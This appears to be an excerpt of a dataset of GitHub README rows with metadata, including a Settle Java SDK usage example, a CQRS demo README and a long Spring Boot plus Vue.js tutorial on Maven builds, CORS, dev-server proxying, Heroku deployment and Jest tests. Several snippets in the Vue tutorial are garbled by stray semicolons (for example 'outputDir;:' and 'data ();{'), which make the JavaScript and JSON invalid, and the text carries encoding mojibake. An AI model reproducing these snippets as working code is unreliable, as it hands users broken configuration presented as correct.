",0,0,1,0.0,"['food', 'delivery', 'backend', 'system', 'configuration', 'technology', 'use', 'installation', 'prerequisite', 'setup', 'configuration', 'run', 'application', 'api', 'documentation', 'security', 'contribute', 'license']","['configuration', 'food', 'delivery', 'backend', 'system']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
settle-club/java-integration-sdk,main,"# Settle Java


Settle client for Java language
[![](https://jitpack.io/v/settle-finance/java-integration-sdk.svg)](https://jitpack.io/#settle-finance/java-integration-sdk)



## Getting Started
Get started with the Java Development SDK for Potlee, Compatible with Java 21


# Usage

1. Create Maven project and add the dependency in the pom.xml 
```xml
    <dependency>
        <groupId>com.github.settle-finance</groupId>
        <artifactId>java-integration-sdk</artifactId>
        <version>1.0.0</version>
    </dependency>
```

2. Add it in your root pom.xml at the end of repositories:
```xml
<repositories>
    <repository>
        <id>jitpack.io</id>
        <url>https://jitpack.io</url>
    </repository>
</repositories>
```

3. Start integrating

### Exampe Usage 
```java
public class Example {
    static PlatformConfig platformConfig;
    static PlatformClient platformClient;

    public static void main(String[] args) {
        try {
            platformConfig = new PlatformConfig(
                    ""COMPANY_ID"",
                    ""API_KEY"",
                    ""API_SECRET"",
                    ""API_TOKEN"",
                    ""https://api.potleez5.de"",
                    false
            );

            platformClient = new PlatformClient(platformConfig);

            PlatformModels.CustomerObject customer = PlatformModels.CustomerObject.builder().countryCode(""91"").mobile(""8898518242"").uid(""1"").build();

            PlatformModels.Device device = PlatformModels.Device.builder().ipAddress(""127.0.0.1"").userAgent(""moz"").build();

            PlatformModels.Order order =  PlatformModels.Order.builder().valueInPaise(100000).uid(""123"").build();

            PlatformModels.VerifyCustomer verifyCustomer = PlatformModels.VerifyCustomer.builder().customer(customer).order(order).device(device).build();

            // Use this API to verify the customer.
            PlatformModels.VerifyCustomerSuccess verifyCustomerSuccess = platformClient.customer.verify(
                    platformConfig.getOrganizationId(),
                    verifyCustomer
            );

            PlatformModels.CreateTransaction createTransaction = PlatformModels.CreateTransaction.builder().customer(customer).order(order).redirectUrl(""https://www.google.com"").build();

            // Use this API to create transaction for user.
            PlatformModels.CreateTransactionSuccess createTransactionSuccess = platformClient.customer.createOrder(
                    platformConfig.getOrganizationId(),
                    createTransaction
            );
   
        } catch (Exception e) {
            System.out.println(e);
        }
    }
}
```

### Documentation
* [Platform](documentation/platform/README.md)",3,0,3,17.0,"['settle', 'java', 'get', 'start', 'usage', 'exampe', 'usage', 'documentation']","['usage', 'settle', 'java', 'get', 'start']",1.0,[org.apache.maven.plugins:maven-compiler-plugin],0.0,1.0,0.0
simasch/cqrs-meets-modern-java,main,"# CQRS Meets Modern Java

This project is used as an example for my talk.

## Prerequisite: jOOQ Build

The cqrs project uses jOOQ and therefore the database model classes must be created with Maven.

Change into the cqrs directory and run:

    ./mvnw compile

## Running the applications

Both applications use Testcontainers support of Spring Boot. Therefore, run the TestCqrsApplication and the
TestTraditionalApplication.

## Testing

The file requests.http contains the http test requests.",0,0,2,0.0,"['cqrs', 'meet', 'modern', 'java', 'prerequisite', 'jooq', 'build', 'run', 'application', 'test']","['cqrs', 'meet', 'modern', 'java', 'prerequisite']",2.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin,org.testcontainers:testcontainers-jooq-codegen-maven-plugin]",0.0,2.0,0.0
baby1194/spring-boot-vuejs,master,"# spring-boot-vuejs

[![Build Status](https://github.com/jonashackt/spring-boot-vuejs/workflows/build/badge.svg)](https://github.com/jonashackt/spring-boot-vuejs/actions)
[![codecov](https://codecov.io/gh/jonashackt/spring-boot-vuejs/branch/master/graph/badge.svg?token=gMQBTyKuKS)](https://codecov.io/gh/jonashackt/spring-boot-vuejs)
[![License](http://img.shields.io/:license-mit-blue.svg)](https://github.com/jonashackt/spring-boot-vuejs/blob/master/LICENSE)
[![renovateenabled](https://img.shields.io/badge/renovate-enabled-yellow)](https://renovatebot.com)
[![versionspringboot](https://img.shields.io/badge/dynamic/xml?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/pom.xml&query=%2F%2A%5Blocal-name%28%29%3D%27project%27%5D%2F%2A%5Blocal-name%28%29%3D%27parent%27%5D%2F%2A%5Blocal-name%28%29%3D%27version%27%5D&label=springboot)](https://github.com/spring-projects/spring-boot)
[![versionjava](https://img.shields.io/badge/jdk-8,_11,_15-brightgreen.svg?logo=java)](https://github.com/spring-projects/spring-boot)
[![versionvuejs](https://img.shields.io/badge/dynamic/json?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package.json&query=$.dependencies.vue&label=vue&logo=vue.js)](https://vuejs.org/)
[![versiontypescript](https://img.shields.io/badge/dynamic/json?color=blue&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package.json&query=$.devDependencies.typescript&label=typescript&logo=typescript)](https://www.typescriptlang.org/)
[![versionbootstrap](https://img.shields.io/badge/dynamic/json?color=blueviolet&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package.json&query=$.dependencies.bootstrap&label=bootstrap&logo=bootstrap.js)](https://getbootstrap.com/)
[![versionnodejs](https://img.shields.io/badge/dynamic/xml?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/pom.xml&query=%2F%2A%5Blocal-name%28%29%3D%27project%27%5D%2F%2A%5Blocal-name%28%29%3D%27build%27%5D%2F%2A%5Blocal-name%28%29%3D%27plugins%27%5D%2F%2A%5Blocal-name%28%29%3D%27plugin%27%5D%2F%2A%5Blocal-name%28%29%3D%27executions%27%5D%2F%2A%5Blocal-name%28%29%3D%27execution%27%5D%2F%2A%5Blocal-name%28%29%3D%27configuration%27%5D%2F%2A%5Blocal-name%28%29%3D%27nodeVersion%27%5D&label=nodejs&logo=node.js)](https://nodejs.org/en/)
[![versionwebpack](https://img.shields.io/badge/dynamic/json?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package-lock.json&query=$.dependencies.webpack.version&label=webpack&logo=webpack)](https://webpack.js.org/)
[![versionaxios](https://img.shields.io/badge/dynamic/json?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package.json&query=$.dependencies.axios&label=axios)](https://github.com/axios/axios)
[![versionjest](https://img.shields.io/badge/dynamic/json?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package-lock.json&query=$.dependencies.jest.version&label=jest&logo=jest)](https://jestjs.io/)
[![versionnightwatch](https://img.shields.io/badge/dynamic/json?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package-lock.json&query=$.dependencies.nightwatch.version&label=nightwatch)](http://nightwatchjs.org/)
[![Deployed on Heroku](https://img.shields.io/badge/heroku-deployed-blueviolet.svg?logo=heroku)](https://spring-boot-vuejs.herokuapp.com/)
[![Pushed to Docker Hub](https://img.shields.io/badge/docker_hub-released-blue.svg?logo=docker)](https://hub.docker.com/r/jonashackt/spring-boot-vuejs)
    
> **If youÂ´re a JavaMagazin / blog.codecentric.de / Softwerker reader**, consider switching to [vue-cli-v2-webpack-v3](https://github.com/jonashackt/spring-boot-vuejs/tree/vue-cli-v2-webpack-v3)

![localhost-first-run](screenshots/localhost-first-run.png)

A live deployment is available on Heroku: https://spring-boot-vuejs.herokuapp.com

This project is used as example in a variety of articles & as eBook:

[![java-magazin-8.2018](screenshots/java-magazin-8.2018.png)](https://jaxenter.de/ausgaben/java-magazin-8-18)
[![entwickler-press-092018](screenshots/entwickler-press-092018.jpg)](https://www.amazon.com/Vue-js-f%C3%BCr-alle-Wissenswertes-Einsteiger-ebook/dp/B07HQF9VX4/ref=sr_1_1?ie=UTF8&qid=1538484852&sr=8-1&keywords=Vue-js-f%C3%BCr-alle-Wissenswertes-Einsteiger-ebook)
[![softwerker-vol12](screenshots/softwerker-vol12.png)](https://info.codecentric.de/softwerker-vol-12)

[blog.codecentric.de/en/2018/04/spring-boot-vuejs](https://blog.codecentric.de/en/2018/04/spring-boot-vuejs) | [JavaMagazin 8.2018](https://jaxenter.de/ausgaben/java-magazin-8-18) | [entwickler.press shortcuts 229](https://www.amazon.com/Vue-js-f%C3%BCr-alle-Wissenswertes-Einsteiger-ebook/dp/B07HQF9VX4/ref=sr_1_1?ie=UTF8&qid=1538484852&sr=8-1&keywords=Vue-js-f%C3%BCr-alle-Wissenswertes-Einsteiger-ebook) | [softwerker Vol.12](https://info.codecentric.de/softwerker-vol-12)

## Upgrade procedure

Get newest node & npm:
```shell
brew upgrade node
npm install -g npm@latest
```

Update vue-cli
```shell
npm install -g @vue/cli
```

Update Vue components/plugins (see https://cli.vuejs.org/migrating-from-v3/#upgrade-all-plugins-at-once)
```shell
vue upgrade
```

## In Search of a new Web Frontend-Framework after 2 Years of absence...

Well, Iâ€™m not a Frontend developer. Iâ€™m more like playing around with Spring Boot, Web- & Microservices & Docker, automating things with Ansible and Docker, Scaling things with Spring Cloud, Docker Compose, and Traefik... And the only GUIs Iâ€™m building are the ""new JS framework in town""-app every two years... :) So the last one was Angular 1 - and it felt, as it was a good choice! I loved the coding experience and after a day of training, I felt able to write awesome Frontends...

But now weâ€™re 2 years later and I heard from afar, that there was a complete rewrite of Angular (2), a new kid in town from Facebook (React) and lots of ES201x stuff and dependency managers like bower and Co. So Iâ€™m now in the new 2-year-cycle of trying to cope up again - and so glad I found this article: https://medium.com/reverdev/why-we-moved-from-angular-2-to-vue-js-and-why-we-didnt-choose-react-ef807d9f4163

Key points are:
* Angular 2 isnâ€™t the way to go if you know version 1 (complete re-write, only with Typescript, loss of many of 1â€™s advantages, Angular 4 is coming)
* React  (facebookish problems (licence), need to choose btw. Redux & MObX, harder learning curve, slower coding speed)

![comparison-angular-react-vuejs](screenshots/comparison-angular-react-vuejs.png)

And the [introduction phrase](https://vuejs.org/v2/guide/index.html) sounds really great:

> Vue (pronounced /vjuË/, like view) is a progressive framework for building user interfaces. Unlike other monolithic frameworks, Vue is designed from the ground up to be incrementally adoptable. The core library is focused on the view layer only and is very easy to pick up and integrate with other libraries or existing projects. On the other hand, Vue is also perfectly capable of powering sophisticated Single-Page Applications when used in combination with modern tooling and supporting libraries.

So I think, it could be a good idea to invest a day or so into Vue.js. Letâ€™s have a look here!



## Setup Vue.js & Spring Boot

### Prerequisites

#### MacOSX

```
brew install node
npm install -g @vue/cli
```

#### Linux

```
sudo apt update
sudo apt install node
npm install -g @vue/cli
```

#### Windows

```
choco install npm
npm install -g @vue/cli
```

## Project setup

```
spring-boot-vuejs
â”œâ”€â”¬ backend     â†’ backend module with Spring Boot code
â”‚ â”œâ”€â”€ src
â”‚ â””â”€â”€ pom.xml
â”œâ”€â”¬ frontend    â†’ frontend module with Vue.js code
â”‚ â”œâ”€â”€ src
â”‚ â””â”€â”€ pom.xml
â””â”€â”€ pom.xml     â†’ Maven parent pom managing both modules
```

## Backend

Go to https://start.spring.io/ and initialize a Spring Boot app with `Web` and `Actuator`. Place the zipâ€™s contents in the backend folder.

Customize pom to copy content from Frontend for serving it later with the embedded Tomcat:

```xml
<build>
  <plugins>
    <plugin>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-maven-plugin</artifactId>
    </plugin>
    <plugin>
      <artifactId>maven-resources-plugin</artifactId>
      <executions>
        <execution>
          <id>copy Vue.js frontend content</id>
          <phase>generate-resources</phase>
          <goals>
            <goal>copy-resources</goal>
          </goals>
          <configuration>
            <outputDirectory>src/main/resources/public</outputDirectory>
            <overwrite>true</overwrite>
            <resources>
              <resource>
                <directory>${project.parent.basedir}/frontend/target/dist</directory>
                <includes>
                  <include>static/</include>
                  <include>index.html</include>
                  <include>favicon.ico</include>
                </includes>
              </resource>
            </resources>
          </configuration>
        </execution>
      </executions>
    </plugin>
  </plugins>
</build>
```


## Frontend

Creating our `frontend` project is done by the slightly changed (we use `--no-git` here, because our parent project is already a git repository and otherwise vue CLI 3 would initialize an new one):

```
vue create frontend --no-git
```

see https://cli.vuejs.org/guide/

This will initialize a project skeleton for Vue.js in /frontend directory - it, therefore, asks some questions in the cli:

![vuejs-cli3-create](screenshots/vuejs-cli3-create.png)

__Do not__ choose the default preset with `default (babel, eslint)`, because we need some more plugins for our project here (choose the Plugins with the __space bar__):

![vuejs-cli3-select-plugins](screenshots/vuejs-cli3-select-plugins.png)

You can now also use the new `vue ui` command/feature to configure your project:

![vue-ui](screenshots/vue-ui.png)

If you want to learn more about installing Vue.js, head over to the docs: https://vuejs.org/v2/guide/installation.html


### Use frontend-maven-plugin to handle NPM, Node, Bower, Grunt, Gulp, Webpack and so on :)

If youâ€™re a backend dev like me, this Maven plugin here https://github.com/eirslett/frontend-maven-plugin is a great help for you - because, if you know Maven, thatâ€™s everything you need! Just add this plugin to the frontendâ€™s `pom.xml`:

```xml
<build>
    <plugins>
        <plugin>
            <groupId>com.github.eirslett</groupId>
            <artifactId>frontend-maven-plugin</artifactId>
            <version>${frontend-maven-plugin.version}</version>
            <executions>
                <!-- Install our node and npm version to run npm/node scripts-->
                <execution>
                    <id>install node and npm</id>
                    <goals>
                        <goal>install-node-and-npm</goal>
                    </goals>
                    <configuration>
                        <nodeVersion>v10.10.0</nodeVersion>
                    </configuration>
                </execution>
                <!-- Install all project dependencies -->
                <execution>
                    <id>npm install</id>
                    <goals>
                        <goal>npm</goal>
                    </goals>
                    <!-- optional: default phase is ""generate-resources"" -->
                    <phase>generate-resources</phase>
                    <!-- Optional configuration which provides for running any npm command -->
                    <configuration>
                        <arguments>install</arguments>
                    </configuration>
                </execution>
                <!-- Build and minify static files -->
                <execution>
                    <id>npm run build</id>
                    <goals>
                        <goal>npm</goal>
                    </goals>
                    <configuration>
                        <arguments>run build</arguments>
        </configuration>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build>
```

### Tell Webpack to output the dist/ contents to target/

Commonly, node projects will create a dist/ directory for builds which contains the minified source code of the web app - but we want it all in `/target`. Therefore we need to create the optional [vue.config.js](https://cli.vuejs.org/config/#vue-config-js) and configure the `outputDir` and `assetsDir` correctly: 

```javascript
module.exports = {
  ...
  // Change build paths to make them Maven compatible
  // see https://cli.vuejs.org/config/
  outputDir;: 'target/dist',
  assetsDir;: 'static';
}
```


## First App run

Inside the root directory, do a: 

```
mvn clean install
```

Run our complete Spring Boot App:

```
mvn --projects backend spring-boot:run
```

Now go to http://localhost:8098/ and have a look at your first Vue.js Spring Boot App.



## Faster feedback with webpack-dev-server

The webpack-dev-server, which will update and build every change through all the parts of the JavaScript build-chain, is pre-configured in Vue.js out-of-the-box! So the only thing needed to get fast feedback development-cycle is to cd into `frontend` and run:

```
npm run serve
```

Thatâ€™s it! 


## Browser developer tools extension

Install vue-devtools Browser extension https://github.com/vuejs/vue-devtools and get better feedback, e.g. in Chrome:

![vue-devtools-chrome](screenshots/vue-devtools-chrome.png)


## IntelliJ integration

There's a blog post: https://blog.jetbrains.com/webstorm/2018/01/working-with-vue-js-in-webstorm/

Especially the `New... Vue Component` looks quite cool :)



## HTTP calls from Vue.js to (Spring Boot) REST backend

Prior to Vue 2.0, there was a build in solution (vue-resource). But from 2.0 on, 3rd party libraries are necessary. One of them is [Axios](https://github.com/mzabriskie/axios) - also see blog post https://alligator.io/vuejs/rest-api-axios/

```
npm install axios --save
```

Calling a REST service with Axios is simple. Go into the script area of your component, e.g. Hello.vue and add:

```js
import axios from 'axios'

data ();{
  return {
    response: [],
    errors: []
  }
},

callRestService ();{
  axios.get(`api/hello`)
    .then(response => {
      // JSON responses are automatically parsed.
      this.response = response.data
    })
    .catch(e => {
      this.errors.push(e)
    })
}
}
```

In your template area you can now request a service call via calling `callRestService()` method and access `response` data:

```html
<button class=â€Search__buttonâ€ @click=""callRestService()"">CALL Spring Boot REST backend service</button>

<h3>{{ response }}</h3>
```

### The problem with SOP

Single-Origin Policy (SOP) could be a problem if we want to develop our app. Because the webpack-dev-server runs on http://localhost:8080 and our Spring Boot REST backend on http://localhost:8098.

We need to use Cross-Origin Resource Sharing Protocol (CORS) to handle that (read more background info about CORS here https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS)


#### Enabling Axios CORS support

Create a central Axios configuration file called `http-commons.js`:

```js
import axios from 'axios'

export const AXIOS = axios.create({
  baseURL: `http://localhost:8098`,
  headers: {
    'Access-Control-Allow-Origin': 'http://localhost:8080'
  }
})
```

Here we allow requests to the base URL of our Spring Boot App on port 8098 to be accessible from 8080.

Now we could use this configuration inside our Components, e.g. in `Hello.vue`:
```js
import {AXIOS} from './http-common'

export default {
  name: 'hello',

  data () {
    return {
      posts: [],
      errors: []
    }
  },
  methods: {
    // Fetches posts when the component is created.
    callRestService () {
      AXIOS.get(`hello`)
        .then(response => {
          // JSON responses are automatically parsed.
          this.posts = response.data
        })
        .catch(e => {
          this.errors.push(e)
        })
    }
  }
```

#### Enabling Spring Boot CORS support

Additionally, we need to configure our Spring Boot backend to answer with the appropriate CORS HTTP Headers in its responses (there's a good tutorial here: https://spring.io/guides/gs/rest-service-cors/). Therefore we add the annotation `@CrossOrigin` to our BackendController:

```java
@CrossOrigin(origins = ""http://localhost:8080"")
@RequestMapping(path = ""/hello"")
public @ResponseBody String sayHello() {
    LOG.info(""GET called on /hello resource"");
    return HELLO_TEXT;
}
```

Now our Backend will respond CORS-enabled and will accept requests from 8080. But as this only enables CORS on one method, we have to repeatedly add this annotation to all of our REST endpoints, which isnâ€™t a nice style. We should use a global solution to allow access with CORS enabled to all of our REST resources. This could be done in the `SpringBootVuejsApplication.class`:

```java
// Enable CORS globally
@Bean
public WebMvcConfigurer corsConfigurer() {
  return new WebMvcConfigurerAdapter() {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
      registry.addMapping(""/api/*"").allowedOrigins(""http://localhost:8080"");
    }
  };
}
```

Now all calls to resources behind `api/` will return the correct CORS headers. 


#### But STOP! Webpack & Vue have something much smarter for us to help us with SOP!

Thanks to my colleague [Daniel](https://www.codecentric.de/team/dre/) who pointed me to the nice proxying feature of Webpack dev-server, we don't need to configure all the complex CORS stuff anymore!

According to the [Vue CLI 3 docs](https://cli.vuejs.org/config) the only thing we need to [configure is a devserver-proxy](https://cli.vuejs.org/config/#devserver-proxy) for our webpack devserver requests. This could be done easily in the optional [vue.config.js](https://cli.vuejs.org/config/#vue-config-js) inside `devServer.proxy`: 

```js
module.exports = {
  // proxy all webpack dev-server requests starting with /api
  // to our Spring Boot backend (localhost:8098) using http-proxy-middleware
  // see https://cli.vuejs.org/config/#devserver-proxy
  devServer: {
    proxy: {
      '/api': {
        target: 'http://localhost:8098',
        ws: true,
        changeOrigin: true
      }
    }
  },
  ...
}
```

With this configuration in place, the webpack dev-server uses the [http-proxy-middleware](https://github.com/chimurai/http-proxy-middleware), which is a really handy component, to proxy all frontend-requests from http://localhost:8080 --> http://localhost:8098 - incl. Changing the Origin accordingly.

This is used in the webpack build process to configure the proxyMiddleware (you don't need to change something here!):

```js
// proxy api requests
Object.keys(proxyTable).forEach(function (context) {
  var options = proxyTable[context];
  if (typeof options === 'string') {
    options = { target: options }
  }
  app.use(proxyMiddleware(options.filter || context, options))
})
```

## Using history mode for nicer URLs

If we use the default configuration of the generated Vue.js template, we see URLs with a `#` inside them - like this:

```
http://localhost:8098/#/bootstrap

or

http://localhost:8098/#/user
```

With the usage of __[HTML5 history mode](https://router.vuejs.org/guide/essentials/history-mode.html#html5-history-mode)__, we can achieve much nicer URLs without the `#` in them. Only thing to do in the Vue.js frontend is to configure our router accordingly inside the [router.js](frontend/src/router.js):

```
...

Vue.use(Router);

const router = new Router({
    mode: 'history', // uris without hashes #, see https://router.vuejs.org/guide/essentials/history-mode.html#html5-history-mode
    routes: [
        { path: '/', component: Hello },
        { path: '/callservice', component: Service },
        ...
```

That's nearly everything. BUT only nearly! If one clicks on a link inside our frontend, the user is correctly send to the wished component. 

But if the user enters the URL directly into the Browser, we get a `Whitelabel Error Page` because our Spring Boot backend gives us a __HTTP 404__ - since this URL isn't present in the backend:

![html5-history-mode-whitelabel-error-page-404](screenshots/html5-history-mode-whitelabel-error-page-404.gif)

The solution is to redirect or better forward the user to the frontend (router) again. The [Vue.js docs don't provide an example configuration for Spring Boot](https://router.vuejs.org/guide/essentials/history-mode.html#example-server-configurations), but luckily [there are other resources](https://www.baeldung.com/spring-redirect-and-forward). In essence we have to implement a forwarding controller in our [BackendController](backend/src/main/java/de/jonashackt/springbootvuejs/controller/BackendController.java):

```
    // Forwards all routes to FrontEnd except: '/', '/index.html', '/api', '/api/**'
    // Required because of 'mode: history' usage in frontend routing, see README for further details
    @RequestMapping(value = ""{_:^(?!index\\.html|api).$}"")
    public String redirectApi() {
        LOG.info(""URL entered directly into the Browser, so we need to redirect..."");
        return ""forward:/"";
    }
```

This controller will forward every request other then `'/', '/index.html', '/api', '/api/**'` to our Vue.js frontend.


## Bootstrap & Vue.js

Thereâ€™s a nice integration of Bootstrap in Vue.js: https://bootstrap-vue.js.org/

```
npm install bootstrap-vue
```

Now you can use all the pretty Bootstrap stuff with ease like:

```
<b-btn @click=""callRestService()"">CALL Spring Boot REST backend service</b-btn>
```

instead of

```
<button type=""button"" class=â€btnâ€ @click=""callRestService()"">CALL Spring Boot REST backend service</button>
```

The docs contain all the possible components: https://bootstrap-vue.js.org/docs/components/alert/

See some elements, when you go to http://localhost:8080/#/bootstrap/ - this should look like this:

![bootstrap-styled-vuejs](screenshots/bootstrap-styled-vuejs.png)

A good discussion about various UI component frameworks: http://vuetips.com/bootstrap


## Heroku Deployment

As you may already read, the app is automatically deployed to Heroku on https://spring-boot-vuejs.herokuapp.com/.

The project makes use of the nice Heroku Pipelines feature, where we do get a full Continuous Delivery pipeline with nearly no effort:

![heroku-pipeline](screenshots/heroku-pipeline.png)

And with the help of super cool `Automatic deploys`, we have our GitHub Actions build our app after every push to master - and with the checkbox set to `Wait for CI to pass before deploy` - the app gets also automatically deployed to Heroku - but only, if the GitHub Actions (and Codegov...) build succeeded:

![heroku-automatic-deploys](screenshots/heroku-automatic-deploys.png)

You only have to connect your Heroku app to GitHub, activate Automatic deploys and set the named checkbox. That's everything!


#### Accessing Spring Boot REST backend on Heroku from Vue.js frontend

Frontend needs to know the Port of our Spring Boot backend API, which is [automatically set by Heroku every time, we (re-)start our App](https://stackoverflow.com/a/12023039/4964553).

> You can [try out your Heroku app locally](https://devcenter.heroku.com/articles/heroku-local)! Just create a .env-File with all your Environment variables and run `heroku local`! 

To access the Heroku set port, we need to use relative paths inside our Vue.js application instead of hard-coded hosts and ports! 

All we need to do is to configure Axios in such a way inside our [frontend/src/components/http-common.js](https://github.com/jonashackt/spring-boot-vuejs/blob/master/frontend/src/components/http-common.js):

```
export const AXIOS = axios.create({
  baseURL: `/api`
})
```

#### Using Heroku's Postgres as Database for Spring Boot backend and Vue.js frontend

First, add [Heroku Postgres database](https://elements.heroku.com/addons/heroku-postgresql) for your Heroku app. 

Then follow these instructions on Stackoverflow to configure all needed Environment variables in Heroku: https://stackoverflow.com/a/49978310/4964553

Mind the addition to the backend's [pom.xml](backend/pom.xml) described here: https://stackoverflow.com/a/49970142/4964553

Now you're able to use Spring Data's magic - all you need is an Interface like [UserRepository.java](backend/src/main/java/de/jonashackt/springbootvuejs/repository/UserRepository.java):

```java
package de.jonashackt.springbootvuejs.repository;

import de.jonashackt.springbootvuejs.domain.User;
import org.springframework.data.repository.CrudRepository;
import org.springframework.data.repository.query.Param;

import java.util.List;

public interface UserRepository extends CrudRepository<User, Long> {

    List<User> findByLastName(@Param(""lastname"") String lastname);

    List<User> findByFirstName(@Param(""firstname"") String firstname);

}

```

Now write your Testcases accordingly like [UserRepositoryTest.java](backend/src/test/java/de/jonashackt/springbootvuejs/repository/UserRepositoryTest.java):

```java
package de.jonashackt.springbootvuejs.repository;

import de.jonashackt.springbootvuejs.domain.User;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.orm.jpa.DataJpaTest;
import org.springframework.boot.test.autoconfigure.orm.jpa.TestEntityManager;
import org.springframework.test.context.junit4.SpringRunner;

import java.util.List;

import static org.hamcrest.Matchers.contains;
import static org.junit.Assert.*;

@RunWith(SpringRunner.class)
@DataJpaTest
public class UserRepositoryTest {

  @Autowired
  private TestEntityManager entityManager;

  @Autowired
  private UserRepository users;

  private final User norbertSiegmund = new User(""Norbert"", ""Siegmund"");
  private final User jonasHecht = new User(""Jonas"", ""Hecht"");

  @Before
  public void fillSomeDataIntoOurDb() {
    // Add new Users to Database
    entityManager.persist(norbertSiegmund);
    entityManager.persist(jonasHecht);
  }

  @Test
  public void testFindByLastName() throws Exception {
    // Search for specific User in Database according to lastname
    List<User> usersWithLastNameSiegmund = users.findByLastName(""Siegmund"");

    assertThat(usersWithLastNameSiegmund, contains(norbertSiegmund));
  }


  @Test
  public void testFindByFirstName() throws Exception {
    // Search for specific User in Database according to firstname
    List<User> usersWithFirstNameJonas = users.findByFirstName(""Jonas"");

    assertThat(usersWithFirstNameJonas, contains(jonasHecht));
  }

}
```

Then include this functionality in your REST-API - see [BackendController.java](backend/src/main/java/de/jonashackt/springbootvuejs/controller/BackendController.java):

```java
    @RequestMapping(path = ""/user"", method = RequestMethod.POST)
    @ResponseStatus(HttpStatus.CREATED)
    public @ResponseBody long addNewUser (@RequestParam String firstName, @RequestParam String lastName) {
        User user = new User(firstName, lastName);
        userRepository.save(user);

        LOG.info(user.toString() + "" successfully saved into DB"");

        return user.getId();
    }
```
 
and use it from the Vue.js frontend, see [User.vue](frontend/src/components/User.vue):

```html
<template>
<div class=""user"">
 <h1>Create User</h1>

 <h3>Just some database interaction...</h3>

 <input type=""text"" v-model=""user.firstName"" placeholder=""first name"">
 <input type=""text"" v-model=""user.lastName"" placeholder=""last name"">

 <button @click=""createUser()"">Create User</button>

 <div v-if=""showResponse""><h6>User created with Id: {{ response }}</h6></div>

 <button v-if=""showResponse"" @click=""retrieveUser()"">Retrieve user {{user.id}} data from database</button>

 <h4 v-if=""showRetrievedUser"">Retrieved User {{retrievedUser.firstName}} {{retrievedUser.lastName}}</h4>

</div>
</template>

<script>
// import axios from 'axios'
import {AXIOS} from './http-common'

export default {
 name: 'user',

 data () {
   return {
     response: [],
     errors: [],
     user: {
       lastName: '',
       firstName: '',
       id: 0
     },
     showResponse: false,
     retrievedUser: {},
     showRetrievedUser: false
   }
 },
 methods: {
   // Fetches posts when the component is created.
   createUser () {
     var params = new URLSearchParams();
     params.append('firstName', this.user.firstName);
     params.append('lastName', this.user.lastName);

     AXIOS.post(`/user`, params)
       .then(response => {
         // JSON responses are automatically parsed.
         this.response = response.data;
         this.user.id = response.data;
         console.log(response.data);
         this.showResponse = true
       })
       .catch(e => {
         this.errors.push(e)
       })
   },
   retrieveUser () {
     AXIOS.get(`/user/` + this.user.id)
       .then(response => {
         // JSON responses are automatically parsed.
         this.retrievedUser = response.data;
         console.log(response.data);
         this.showRetrievedUser = true
       })
       .catch(e => {
         this.errors.push(e)
       })
   }
 }
}

</script>
```


## Testing 

### Install vue-test-utils

https://github.com/vuejs/vue-test-utils

`npm install --save-dev @vue/test-utils`

### Jest

Jest is a new shooting star in the sky of JavaScript testing frameworks: https://facebook.github.io/jest/

Intro-Blogpost: https://blog.codecentric.de/2017/06/javascript-unit-tests-sind-schwer-aufzusetzen-keep-calm-use-jest/

Examples: https://github.com/vuejs/vue-test-utils-jest-example

Vue.js Jest Docs: https://vue-test-utils.vuejs.org/guides/#testing-single-file-components-with-jest

A Jest Unittest looks like [Hello.spec.js](frontend/test/components/Hello.spec.js):

```js
import { shallowMount } from '@vue/test-utils';
import Hello from '@/components/Hello'

describe('Hello.vue', () => {
  it('should render correct hello message', () => {
    // Given
    const hellowrapped = shallowMount(Hello, {
      propsData: { hellomsg: 'Welcome to your Jest powered Vue.js App' },
      stubs: ['router-link', 'router-view']
    });

    // When
    const contentH1 = hellowrapped.find('h1');

    // Then
    expect(contentH1.text()).toEqual('Welcome to your Jest powered Vue.js App');
  })
})
```

To pass Component props while using Vue.js Router, see https://stackoverflow.com/a/37940045/4964553.

How to test components with `router-view` or `router-link` https://vue-test-utils.vuejs.org/guides/using-with-vue-router.html#testing-components-that-use-router-link-or-router-view.

The test files itself could be named `xyz.spec.js` or `xyz.test.js` - and could reside nearly everywhere in the project.

##### Jest Configuration  

The Jest run-configuration is done inside the [package.json](frontend/package.json):

```js
""scripts"";: {
    ...
    ""test:unit"";: ""vue-cli-service test:unit --coverage"",;
    ....
  },
```

Jest can be configured via `jest.config.js` in your project root, or the `jest` field in [package.json](frontend/package.json). In our case we especially need to configure `coverageDirectory`:

```json
  ],
  ""jest"": {
    ...
    ""coverageDirectory"": ""<rootDir>/tests/unit/coverage"",
    ""collectCoverageFrom"": [
      ""src/**/*.{js,vue}"",
      ""!src/main.js"",
      ""!src/router/index.js"",
      ""!**/node_modules/**""
    ]
  }
}
```

Jest needs to know the right output directory `/tests/unit/coverage` to show a correct output when `npm run test:unit` is run (or the corresponding Maven build). If you run the Jest Unit tests now with:

`npm run test:unit`

- youÂ´ll recognize the table of test covered files:

![unittestrun-jest](screenshots/unittestrun-jest.png)


##### Integration in Maven build (via frontend-maven-plugin)

Inside the [pom.xml](pom.xml) we always automatically run the Jest Unittests with the following configuration:

```xml
<!-- Run Unit tests -->
  <execution>
    <id>npm run test:unit</id>
    <goals>
      <goal>npm</goal>
    </goals>
    <!-- optional: default phase is ""generate-resources"" -->
    <phase>test</phase>
    <!-- Optional configuration which provides for running any npm command -->
    <configuration>
      <arguments>run test:unit</arguments>
    </configuration>
  </execution>
```

